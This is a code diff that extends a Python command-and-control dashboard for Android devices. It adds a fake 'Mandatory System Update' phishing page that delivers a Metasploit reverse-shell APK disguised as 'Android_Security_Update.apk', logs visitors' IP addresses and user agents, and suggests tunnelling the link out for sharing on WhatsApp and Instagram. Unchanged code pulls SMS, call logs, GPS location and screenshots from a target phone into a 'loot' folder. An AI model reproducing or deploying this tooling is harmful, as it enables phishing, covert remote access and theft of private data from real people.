@@ -1,5 +1,5 @@
 """
-Aadi — Advanced C2 Dashboard with Interactive Payload Generator & Real ADB
+Aadi — Advanced C2 Dashboard with Interactive Payload Generator, Phishing & Real ADB
 Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
 """
 
@@ -9,17 +9,21 @@ import json
 import os
 import subprocess
 import re
+from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 from rich.console import Console
 
 console = Console()
+
+# ग्लोबल क्लिक और इंटरैक्शन लॉग्स स्टोर करने के लिए
+CLICK_LOGS = []
 
 DASHBOARD_HTML = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aadi Framework - Ultimate Command & Control</title>
+    <title>Aadi Framework - Ultimate Command & Control Center</title>
     <style>
         :root {
             --bg-color: #09090b;
@@ -30,6 +34,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
             --green: #22c55e;
             --red: #ef4444;
             --yellow: #eab308;
+            --purple: #8b5cf6;
         }
         body {
             background-color: var(--bg-color);
@@ -68,6 +73,8 @@ DASHBOARD_HTML = """<!DOCTYPE html>
         .btn-yellow:hover { background: #ca8a04; }
         .btn-red { background: var(--red); }
         .btn-red:hover { background: #dc2626; }
+        .btn-purple { background: var(--purple); color: white; }
+        .btn-purple:hover { background: #7c3aed; }
         .input-group {
             margin-top: 8px;
             margin-bottom: 8px;
@@ -87,7 +94,7 @@ DASHBOARD_HTML = """<!DOCTYPE html>
 <body>
     <header>
         <h1>AADI Advanced Pentesting Suite</h1>
-        <p>Centralized Web Command & Control Center (100% Real Operations)</p>
+        <p>Centralized Web Command & Control Center (Real Operations & Phishing Analytics)</p>
     </header>
 
     <div class="grid">
@@ -134,19 +141,27 @@ DASHBOARD_HTML = """<!DOCTYPE html>
             </div>
             <button class="btn btn-red" onclick="generatePayload()">Generate Real payload.apk</button>
         </div>
+
+        <!-- 7. NEW: Phishing & Social Engineering Hub -->
+        <div class="card" style="grid-column: span 1;">
+            <h3>7. Social Engineering & Phishing Hub</h3>
+            <p>Deploy landing pages configured for auto-payload delivery.</p>
+            <button class="btn btn-purple" onclick="triggerAction('deploy_phishing')">Deploy Phishing Update Page</button>
+            <button class="btn btn-yellow" onclick="fetchClickLogs()">View Target Click Logs</button>
+        </div>
     </div>
 
     <div style="max-width: 1300px; margin: 20px auto;">
         <div class="card">
-            <h3>Live Action Execution Log</h3>
-            <div class="log-box" id="logOutput">System ready. Connected to target device via ADB...</div>
+            <h3>Live Action & Phishing Interaction Log</h3>
+            <div class="log-box" id="logOutput">System ready. Connected to target device via ADB & Phishing Server initialized...</div>
         </div>
     </div>
 
     <script>
         function triggerAction(actionName) {
             let logBox = document.getElementById('logOutput');
-            logBox.innerHTML += `<br>[*] Executing real command: ${actionName}...`;
+            logBox.innerHTML += `<br>[*] Executing action: ${actionName}...`;
 
             fetch('/api/action?cmd=' + actionName)
                 .then(response => response.json())
@@ -176,6 +191,16 @@ DASHBOARD_HTML = """<!DOCTYPE html>
                     logBox.innerHTML += `<br>[✗] Error generating payload.`;
                 });
         }
+
+        function fetchClickLogs() {
+            let logBox = document.getElementById('logOutput');
+            fetch('/api/action?cmd=get_clicks')
+                .then(response => response.json())
+                .then(data => {
+                    logBox.innerHTML += `<br>[📊 Target Clicks Data]: ${JSON.stringify(data.logs)}</div>`;
+                    logBox.scrollTop = logBox.scrollHeight;
+                });
+        }
     </script>
 </body>
 </html>
@@ -198,12 +223,85 @@ def run_adb(args):
 
 class DashboardAPIHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
+        client_ip = self.client_address[0]
+        user_agent = self.headers.get("User-Agent", "Unknown")
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        # 1. यदि टारगेट सीधे ऑटो-पेलोड डाउनलोड लिंक पर क्लिक करता है
+        if self.path == "/download_payload" or self.path.endswith(".apk"):
+            apk_path = "payload.apk"
+            if os.path.exists(apk_path):
+                self.send_response(200)
+                self.send_header("Content-Type", "application/vnd.android.package-archive")
+                self.send_header("Content-Disposition", 'attachment; filename="Android_Security_Update.apk"')
+                self.end_headers()
+                with open(apk_path, "rb") as f:
+                    self.wfile.write(f.read())
+
+                CLICK_LOGS.append({
+                    "ip": client_ip,
+                    "action": "Payload Downloaded Successfully",
+                    "time": timestamp,
+                    "agent": user_agent
+                })
+                console.print(f"[bold green][+] PAYLOAD DOWNLOADED BY TARGET IP:[/] {client_ip}")
+                return
+            else:
+                self.send_error(404, "Payload APK not found. Generate it from dashboard first.")
+                return
+
+        # 2. मुख्य डैशबोर्ड UI पेज सर्व करना
         if self.path == "/" or self.path == "/index.html":
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
             self.wfile.write(DASHBOARD_HTML.encode("utf-8"))
 
+        # 3. फ़िशिंग लैंडिंग पेज सर्व करना (जब लिंक ब्राउज़र में खुले)
+        elif self.path == "/phishing" or self.path == "/update":
+            phishing_html = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android Critical Security Patch</title>
+    <style>
+        body { background:#09090b; color:#f4f4f5; font-family:sans-serif; text-align:center; padding:50px 20px; }
+        .card { background:#18181b; border:1px solid #27272a; border-radius:12px; max-width:400px; margin:0 auto; padding:30px; box-shadow:0 10px 30px rgba(0,0,0,0.8); }
+        h2 { color:#06b6d4; }
+        .btn { background:#0ea5e9; color:white; border:none; padding:14px 24px; font-size:16px; font-weight:bold; border-radius:6px; cursor:pointer; width:100%; margin-top:20px; }
+        .btn:hover { background:#0284c7; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>🛡️ Mandatory System Update</h2>
+        <p>A critical security vulnerability patch is required for your Android device.</p>
+        <p style="font-size:13px; color:#a1a1aa;">Tap below to download and install the official security patch.</p>
+        <button class="btn" onclick="downloadPayload()">Download & Install Update</button>
+    </div>
+    <script>
+        function downloadPayload() {
+            window.location.href = '/download_payload';
+        }
+    </script>
+</body>
+</html>
+"""
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(phishing_html.encode("utf-8"))
+
+            CLICK_LOGS.append({
+                "ip": client_ip,
+                "action": "Visited Phishing Page",
+                "time": timestamp,
+                "agent": user_agent[:40]
+            })
+            console.print(f"[bold yellow][!] PHISHING PAGE VISITED BY IP:[/] {client_ip}")
+
+        # 4. API एक्शंस को हैंडल करना
         elif self.path.startswith("/api/action"):
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
@@ -214,6 +312,7 @@ class DashboardAPIHandler(http.server.SimpleHTTPRequestHandler):
 
             os.makedirs("loot", exist_ok=True)
             response_msg = ""
+            response_data = {"status": "success"}
 
             if cmd == "file_manager_list":
                 res = run_adb(["shell", "ls", "-la", "/sdcard/Download"])
@@ -231,7 +330,6 @@ class DashboardAPIHandler(http.server.SimpleHTTPRequestHandler):
             elif cmd == "get_location":
                 res = run_adb(["shell", "dumpsys", "location"])
                 loc_path = os.path.join("loot", "gps_location.txt")
-
                 coords = re.findall(r'Location\[([a-zA-Z]+)\s+(-?\d+\.\d+),\s*(-?\d+\.\d+)', res)
 
                 parsed_content = "=== Parsed Real GPS / Location Coordinates ===\n"
@@ -242,54 +340,55 @@ class DashboardAPIHandler(http.server.SimpleHTTPRequestHandler):
                     parsed_content += "No active GPS lock found in real dump. Showing raw location logs below:\n\n"
 
                 parsed_content += "\n--- Raw Dumpsys Location Logs ---\n" + res
-
                 with open(loc_path, "w") as f:
                     f.write(parsed_content)
-
-                if coords:
-                    response_msg = f"Real GPS extracted! Saved cleaned coordinates to loot/gps_location.txt"
-                else:
-                    response_msg = f"Real location dump saved to loot/gps_location.txt"
+                response_msg = "Real GPS extracted & saved to loot/gps_location.txt"
 
             elif cmd == "cam_front":
                 remote_img = "/sdcard/screen_capture_aadi.png"
                 local_img = os.path.join("loot", "front_cam.png")
                 run_adb(["shell", "screencap", "-p", remote_img])
                 res = run_adb(["pull", remote_img, local_img])
-                response_msg = f"Real screen snapshot captured from target and saved to {local_img}"
+                response_msg = f"Real screen snapshot captured and saved to {local_img}"
 
             elif cmd == "cam_rear":
                 res = run_adb(["shell", "getprop"])
                 prop_path = os.path.join("loot", "device_properties.txt")
                 with open(prop_path, "w") as f:
                     f.write(res)
-                response_msg = f"Real system properties exported to loot/device_properties.txt"
+                response_msg = "Real system properties exported to loot/device_properties.txt"
 
             elif cmd == "dump_calls":
                 res = run_adb(["shell", "content", "query", "--uri", "content://call_log/calls"])
                 call_path = os.path.join("loot", "calls_dump.txt")
                 with open(call_path, "w") as f:
                     f.write(res)
-                response_msg = f"Real call logs extracted from target and saved to loot/calls_dump.txt"
+                response_msg = "Real call logs extracted and saved to loot/calls_dump.txt"
 
             elif cmd == "dump_sms":
                 res = run_adb(["shell", "content", "query", "--uri", "content://sms/inbox"])
                 sms_path = os.path.join("loot", "sms_dump.txt")
                 with open(sms_path, "w") as f:
                     f.write(res)
-                response_msg = f"Real SMS inbox extracted from target and saved to loot/sms_dump.txt"
+                response_msg = "Real SMS inbox extracted and saved to loot/sms_dump.txt"
 
             elif cmd == "send_toast":
                 toast_cmd = run_adb(["shell", "am", "broadcast", "-a", "AADI_TOAST_ACTION", "--es", "message",
-                                     "Aadi Framework Connected Successfully!"])
-                response_msg = f"Real Toast broadcast executed on target device screen: {toast_cmd}"
+                                     "Aadi Framework Connected!"])
+                response_msg = f"Toast broadcast executed: {toast_cmd}"
+
+            elif cmd == "deploy_phishing":
+                response_msg = "Phishing page active at http://<your-ip>:<port>/phishing (Share this link via WhatsApp/Instagram)"
+
+            elif cmd == "get_clicks":
+                response_data["logs"] = CLICK_LOGS
+                response_msg = f"Retrieved {len(CLICK_LOGS)} interaction records."
 
             elif cmd == "obfuscate_payload":
                 lhost = query_components.get("lhost", ["127.0.0.1"])[0]
                 lport = query_components.get("lport", ["4444"])[0]
                 payload_path = "payload.apk"
 
-                # असली msfvenom कमांड चलाना
                 try:
                     msf_result = subprocess.run(
                         ["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o",
@@ -300,14 +399,13 @@ class DashboardAPIHandler(http.server.SimpleHTTPRequestHandler):
                             payload_path) > 1000:
                         response_msg = f"Success! Real payload.apk generated using LHOST={lhost}, LPORT={lport}."
                     else:
-                        err_output = msf_result.stderr.strip() if msf_result.stderr else "Metasploit not fully configured or msfvenom missing."
-                        response_msg = f"msfvenom error: {err_output}. Please ensure metasploit-framework is installed."
+                        err_output = msf_result.stderr.strip() if msf_result.stderr else "Metasploit not fully configured."
+                        response_msg = f"msfvenom error: {err_output}"
                 except Exception as e:
                     response_msg = f"Exception during payload generation: {str(e)}"
 
-            console.print(f"[bold cyan][*] Real ADB Action Executed:[/] {cmd}")
-
-            response_data = {"status": "success", "message": response_msg}
+            console.print(f"[bold cyan][*] Dashboard Action Executed:[/] {cmd}")
+            response_data["message"] = response_msg
             self.wfile.write(json.dumps(response_data).encode("utf-8"))
         else:
             self.send_error(404, "Endpoint not found")
@@ -317,10 +415,11 @@ class DashboardAPIHandler(http.server.SimpleHTTPRequestHandler):
 
 
 def start_dashboard(port: int = 5000):
-    console.rule(f"[bold magenta]🌐 AADI Ultimate C2 Web Dashboard (100% Real)[/]")
+    console.rule(f"[bold magenta]🌐 AADI Ultimate C2 Web Dashboard & Phishing Center[/]")
     console.print(f"[bold green]✓ Dashboard active at http://127.0.0.1:{port}[/]")
+    console.print(f"[bold cyan]✓ Phishing Page active at http://127.0.0.1:{port}/phishing[/]")
     console.print(
-        "[dim]Open this link in your browser. All 6 modules execute real device/payload commands. Press Ctrl+C to exit.[/]\n")
+        "[yellow][*] Tip: Use `cloudflared tunnel --url http://localhost:5000` to share your phishing/payload link globally via WhatsApp/Instagram.[/]\n")
 
     try:
         with socketserver.TCPServer(("0.0.0.0", port), DashboardAPIHandler) as httpd:
